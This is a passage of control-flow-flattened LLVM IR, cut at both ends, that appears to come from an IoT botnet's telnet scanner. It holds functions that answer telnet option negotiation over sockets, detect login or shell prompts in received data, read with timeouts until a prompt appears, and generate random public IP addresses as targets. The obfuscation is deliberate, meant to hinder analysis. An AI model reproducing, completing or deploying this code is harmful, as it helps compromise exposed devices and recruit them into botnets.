  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %39, %36, %26, %19, %11, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %.reg2mem = alloca i32
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -241160660, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 -241160660, label %NodeBlock
    i32 1813358848, label %LeafBlock1
    i32 1357296423, label %LeafBlock
    i32 2052223610, label %16
    i32 -1946635467, label %17
    i32 -1784880136, label %26
    i32 -849027070, label %27
    i32 -691356112, label %34
    i32 -2008208920, label %35
    i32 -1316409935, label %42
    i32 1523133494, label %50
    i32 -2038983961, label %58
    i32 -862270991, label %59
    i32 -368504506, label %60
    i32 204844004, label %NewDefault
    i32 1327836151, label %67
    i32 758074053, label %68
    i32 -2097445996, label %69
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload5, 255
  %13 = select i1 %Pivot, i32 1357296423, i32 1813358848
  store i32 %13, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload, 255
  %14 = select i1 %SwitchLeaf2, i32 2052223610, i32 204844004
  store i32 %14, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload4 = load volatile i32, i32* %.reg2mem
  %.off = add i32 %.reload4, -251
  %SwitchLeaf = icmp ule i32 %.off, 3
  %15 = select i1 %SwitchLeaf, i32 -1946635467, i32 204844004
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 -2097445996, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i8 -1, i8* %8, align 1
  %18 = load i32, i32* %5, align 4
  %19 = call i64 @send(i32 %18, i8* %8, i64 1, i32 16384)
  %20 = load i8*, i8** %6, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 252, %23
  %25 = select i1 %24, i32 -1784880136, i32 -849027070
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  store i8 -2, i8* %8, align 1
  store i32 -368504506, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i8*, i8** %6, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 1
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 254, %31
  %33 = select i1 %32, i32 -691356112, i32 -2008208920
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i8 -4, i8* %8, align 1
  store i32 -862270991, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8*, i8** %6, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 3, %39
  %41 = select i1 %40, i32 -1316409935, i32 1523133494
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %6, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8, i8* %44, align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 253
  %48 = select i1 %47, i32 251, i32 253
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %8, align 1
  store i32 -2038983961, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %6, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 253
  %56 = select i1 %55, i32 252, i32 254
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %8, align 1
  store i32 -2038983961, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 -862270991, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 -368504506, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %5, align 4
  %62 = call i64 @send(i32 %61, i8* %8, i64 1, i32 16384)
  %63 = load i32, i32* %5, align 4
  %64 = load i8*, i8** %6, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 2
  %66 = call i64 @send(i32 %63, i8* %65, i64 1, i32 16384)
  store i32 758074053, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 1327836151, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 758074053, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 -2097445996, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %4, align 4
  ret i32 %70

loopEnd:                                          ; preds = %68, %67, %NewDefault, %60, %59, %58, %50, %42, %35, %34, %27, %26, %17, %16, %LeafBlock, %LeafBlock1, %NodeBlock, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 1279947280, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1279947280, label %11
    i32 -1109858056, label %18
    i32 -741765563, label %19
    i32 -114901827, label %24
    i32 -1072541361, label %37
    i32 1443941977, label %50
    i32 78507819, label %63
    i32 903378290, label %75
    i32 -1464411061, label %76
    i32 2050800604, label %78
    i32 447067160, label %81
    i32 598649377, label %100
    i32 1305115599, label %101
    i32 837018723, label %102
    i32 631580923, label %105
    i32 -501794100, label %106
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  %17 = select i1 %16, i32 -1109858056, i32 631580923
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 -741765563, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %5, align 4
  %21 = load i32, i32* %7, align 4
  %22 = icmp sgt i32 %20, %21
  %23 = select i1 %22, i32 -114901827, i32 -1464411061
  store i32 %23, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %3, align 8
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i32, i32* %7, align 4
  %30 = sext i32 %29 to i64
  %31 = sub i64 0, %30
  %32 = getelementptr inbounds i8, i8* %28, i64 %31
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 0
  %36 = select i1 %35, i32 903378290, i32 -1072541361
  store i32 %36, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, %43
  %45 = getelementptr inbounds i8, i8* %41, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 32
  %49 = select i1 %48, i32 903378290, i32 1443941977
  store i32 %49, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %3, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 0, %56
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 13
  %62 = select i1 %61, i32 903378290, i32 78507819
  store i32 %62, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i8*, i8** %3, align 8
  %65 = load i32, i32* %5, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i32, i32* %7, align 4
  %69 = sext i32 %68 to i64
  %70 = sub i64 0, %69
  %71 = getelementptr inbounds i8, i8* %67, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = icmp eq i32 %73, 10
  store i32 903378290, i32* %switchVar
  store i1 %74, i1* %.reg2mem
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 -1464411061, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %77 = select i1 %.reload3, i32 2050800604, i32 447067160
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %7, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %7, align 4
  store i32 -741765563, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i8*, i8** %3, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %82, i64 %84
  %86 = load i32, i32* %7, align 4
  %87 = sext i32 %86 to i64
  %88 = sub i64 0, %87
  %89 = getelementptr inbounds i8, i8* %85, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = sext i8 %90 to i32
  %92 = load i8*, i8** %4, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = load i8, i8* %95, align 1
  %97 = sext i8 %96 to i32
  %98 = icmp eq i32 %91, %97
  %99 = select i1 %98, i32 598649377, i32 1305115599
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 -501794100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  store i32 837018723, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %6, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %6, align 4
  store i32 1279947280, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -501794100, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  ret i32 %107

loopEnd:                                          ; preds = %105, %102, %101, %100, %81, %78, %76, %75, %63, %50, %37, %24, %19, %18, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  %switchVar = alloca i32
  store i32 -2038702804, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %8
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2038702804, label %33
    i32 1212545416, label %39
    i32 -1218000878, label %44
    i32 -1375120354, label %48
    i32 -7780811, label %49
    i32 336916483, label %51
    i32 -227949192, label %52
    i32 1465987364, label %61
    i32 -138095545, label %78
    i32 -1389567416, label %79
    i32 13477927, label %91
    i32 2020622677, label %95
    i32 1121103093, label %96
    i32 932843327, label %105
    i32 690143935, label %114
    i32 -754125666, label %118
    i32 -1176830598, label %119
    i32 -1620816402, label %128
    i32 -588079317, label %129
    i32 -861364208, label %130
    i32 254780397, label %136
    i32 -261742603, label %140
    i32 -1863925634, label %145
    i32 -1965314958, label %146
    i32 -1626246038, label %147
    i32 -1494890975, label %148
    i32 1474842719, label %152
    i32 -1376615157, label %153
    i32 -1182090557, label %154
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  %38 = select i1 %37, i32 1212545416, i32 -7780811
  store i32 %38, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %41 = load i64, i64* %40, align 8
  %42 = icmp sgt i64 %41, 0
  %43 = select i1 %42, i32 -1375120354, i32 -1218000878
  store i32 %43, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %46 = load i64, i64* %45, align 8
  %47 = icmp sgt i64 %46, 0
  store i32 -1375120354, i32* %switchVar
  store i1 %47, i1* %.reg2mem
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 -7780811, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %50 = select i1 %.reload3, i32 336916483, i32 -1494890975
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 -227949192, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %54 = getelementptr inbounds [16 x i64], [16 x i64]* %53, i64 0, i64 0
  %55 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %54) #2, !srcloc !4
  %56 = extractvalue { i64, i64* } %55, 0
  %57 = extractvalue { i64, i64* } %55, 1
  %58 = trunc i64 %56 to i32
  store i32 %58, i32* %24, align 4
  %59 = ptrtoint i64* %57 to i64
  %60 = trunc i64 %59 to i32
  store i32 %60, i32* %25, align 4
  store i32 1465987364, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %10, align 4
  %63 = srem i32 %62, 64
  %64 = zext i32 %63 to i64
  %65 = shl i64 1, %64
  %66 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %67 = load i32, i32* %10, align 4
  %68 = sdiv i32 %67, 64
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [16 x i64], [16 x i64]* %66, i64 0, i64 %69
  %71 = load i64, i64* %70, align 8
  %72 = or i64 %71, %65
  store i64 %72, i64* %70, align 8
  %73 = load i32, i32* %10, align 4
  %74 = add nsw i32 %73, 1
  %75 = call i32 @select(i32 %74, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %76 = icmp slt i32 %75, 1
  %77 = select i1 %76, i32 -138095545, i32 -1389567416
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 -1494890975, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8*, i8** %15, align 8
  %81 = load i32, i32* %18, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  store i8* %83, i8** %23, align 8
  %84 = load i32, i32* %10, align 4
  %85 = load i8*, i8** %23, align 8
  %86 = call i64 @recv(i32 %84, i8* %85, i64 1, i32 0)
  %87 = trunc i64 %86 to i32
  store i32 %87, i32* %19, align 4
  %88 = load i32, i32* %19, align 4
  %89 = icmp eq i32 %88, -1
  %90 = select i1 %89, i32 2020622677, i32 13477927
  store i32 %90, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %19, align 4
  %93 = icmp eq i32 %92, 0
  %94 = select i1 %93, i32 2020622677, i32 1121103093
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1182090557, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %19, align 4
  %98 = load i32, i32* %18, align 4
  %99 = add nsw i32 %98, %97
  store i32 %99, i32* %18, align 4
  %100 = load i8*, i8** %23, align 8
  %101 = load i8, i8* %100, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 255
  %104 = select i1 %103, i32 932843327, i32 -861364208
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %10, align 4
  %107 = load i8*, i8** %23, align 8
  %108 = getelementptr inbounds i8, i8* %107, i64 1
  %109 = call i64 @recv(i32 %106, i8* %108, i64 2, i32 0)
  %110 = trunc i64 %109 to i32
  store i32 %110, i32* %19, align 4
  %111 = load i32, i32* %19, align 4
  %112 = icmp eq i32 %111, -1
  %113 = select i1 %112, i32 -754125666, i32 690143935
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %19, align 4
  %116 = icmp eq i32 %115, 0
  %117 = select i1 %116, i32 -754125666, i32 -1176830598
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1182090557, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i32, i32* %19, align 4
  %121 = load i32, i32* %18, align 4
  %122 = add nsw i32 %121, %120
  store i32 %122, i32* %18, align 4
  %123 = load i32, i32* %10, align 4
  %124 = load i8*, i8** %23, align 8
  %125 = call i32 @negotiate(i32 %123, i8* %124, i32 3)
  %126 = icmp ne i32 %125, 0
  %127 = select i1 %126, i32 -588079317, i32 -1620816402
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1182090557, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  store i32 -1626246038, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i8*, i8** %15, align 8
  %132 = load i8*, i8** %11, align 8
  %133 = call i8* @strstr(i8* %131, i8* %132) #10
  %134 = icmp ne i8* %133, null
  %135 = select i1 %134, i32 -1863925634, i32 254780397
  store i32 %135, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load i32, i32* %12, align 4
  %138 = icmp ne i32 %137, 0
  %139 = select i1 %138, i32 -261742603, i32 -1965314958
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load i8*, i8** %15, align 8
  %142 = call i32 @matchPrompt(i8* %141)
  %143 = icmp ne i32 %142, 0
  %144 = select i1 %143, i32 -1863925634, i32 -1965314958
  store i32 %144, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  store i32 1, i32* %20, align 4
  store i32 -1494890975, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  store i32 -1626246038, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  store i32 -2038702804, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* %20, align 4
  %150 = icmp ne i32 %149, 0
  %151 = select i1 %150, i32 1474842719, i32 -1376615157
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  store i32 -1182090557, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1182090557, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i32, i32* %9, align 4
  ret i32 %155

loopEnd:                                          ; preds = %153, %152, %148, %147, %146, %145, %140, %136, %130, %129, %128, %119, %118, %114, %105, %96, %95, %91, %79, %78, %61, %52, %51, %49, %48, %44, %39, %33, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  %3 = alloca [16 x i8], align 16
  %4 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %5 = zext i8 %4 to i32
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -401953963, i32* %switchVar
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -401953963, label %first
    i32 1986575495, label %8
    i32 694795761, label %13
    i32 880898825, label %29
    i32 98897439, label %42
    i32 554391081, label %47
    i32 -1860406887, label %52
    i32 1317117451, label %57
    i32 1629079343, label %62
    i32 -1188493063, label %67
    i32 367287959, label %72
    i32 -304028187, label %77
    i32 1427345528, label %82
    i32 1397667163, label %87
    i32 -1204297099, label %92
    i32 676248865, label %97
    i32 1512162544, label %102
    i32 -1546841343, label %107
    i32 -176051615, label %112
    i32 -397469254, label %117
    i32 -2067022796, label %122
    i32 -2130924902, label %127
    i32 719272327, label %132
    i32 -370301464, label %137
    i32 1840925090, label %142
    i32 2018465637, label %147
    i32 449274736, label %152
    i32 911089537, label %157
    i32 2116975999, label %162
    i32 1741921928, label %167
    i32 -294090897, label %172
    i32 -1560005182, label %177
    i32 -142529362, label %182
    i32 641835496, label %187
    i32 456896639, label %192
    i32 293570007, label %197
    i32 1619432114, label %202
    i32 -2096824717, label %207
    i32 1838285739, label %212
    i32 1417248875, label %217
    i32 852399126, label %222
    i32 272661365, label %227
    i32 -1727081816, label %232
    i32 -601022041, label %237
    i32 -686526401, label %242
    i32 1003246388, label %247
    i32 -2116362706, label %252
    i32 802618434, label %257
    i32 1896282365, label %262
    i32 1146017107, label %267
    i32 725913901, label %272
    i32 460880712, label %277
    i32 560066687, label %282
    i32 1295308295, label %287
    i32 -705392772, label %292
    i32 -545951619, label %297
    i32 1699061175, label %302
    i32 1016203538, label %307
    i32 -1049199010, label %312
    i32 -677275399, label %317
    i32 1978352591, label %322
    i32 -252338759, label %327
    i32 1482562186, label %332
    i32 -1736401992, label %337
    i32 -1140982399, label %342
    i32 1790291591, label %347
    i32 171974191, label %352
    i32 51418874, label %357
    i32 169470472, label %362
    i32 1720817343, label %367
    i32 -112872553, label %372
    i32 -181003831, label %377
    i32 -2101912349, label %382
    i32 1239752045, label %387
    i32 924719495, label %392
    i32 -1026292314, label %397
    i32 1192931700, label %402
    i32 -587138478, label %407
    i32 2035927624, label %412
    i32 -2064084927, label %417
    i32 493786704, label %422
    i32 -1735370332, label %427
    i32 167264095, label %432
    i32 -501797600, label %437
    i32 684739401, label %442
    i32 -104754497, label %447
    i32 1126082424, label %452
    i32 -1712843334, label %457
    i32 -1774501389, label %462
    i32 295854747, label %467
    i32 -1850872974, label %472
    i32 -1972989253, label %477
    i32 764465819, label %482
    i32 1761992181, label %487
    i32 -105032696, label %492
    i32 1382188038, label %497
    i32 591645756, label %502
    i32 -137969967, label %507
    i32 -47280997, label %512
    i32 1957428121, label %517
    i32 -2085861972, label %522
    i32 -1302990288, label %527
    i32 946011162, label %532
    i32 2125559730, label %537
    i32 -1818999518, label %542
    i32 2135147140, label %547
    i32 1785560378, label %552
    i32 -1928531517, label %557
    i32 -1418863590, label %562
    i32 -1224006934, label %567
    i32 -1853829288, label %572
    i32 -1055483830, label %577
    i32 -1561829937, label %582
    i32 719483979, label %587
    i32 -420681152, label %592
    i32 1000773382, label %597
    i32 1498009686, label %602
    i32 -1170095217, label %607
    i32 -166468473, label %612
    i32 1057693124, label %617
    i32 -1084696948, label %622
    i32 1769809650, label %627
    i32 -1876751653, label %632
    i32 387639951, label %637
    i32 -29538919, label %642
    i32 1156734040, label %647
    i32 -432128751, label %652
    i32 -259193352, label %657
    i32 -1383318438, label %661
    i32 -1477538549, label %663
    i32 1728563677, label %676
    i32 1577445099, label %690
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp sgt i32 %.reload, 0
  %7 = select i1 %6, i32 1986575495, i32 880898825
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %10 = zext i8 %9 to i32
  %11 = icmp slt i32 %10, 255
  %12 = select i1 %11, i32 694795761, i32 880898825
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %15 = add i8 %14, 1
  store i8 %15, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %16 = bitcast [16 x i8]* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 16, i32 16, i1 false)
  %17 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %18 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %19 = zext i8 %18 to i32
  %20 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %21 = zext i8 %20 to i32
  %22 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
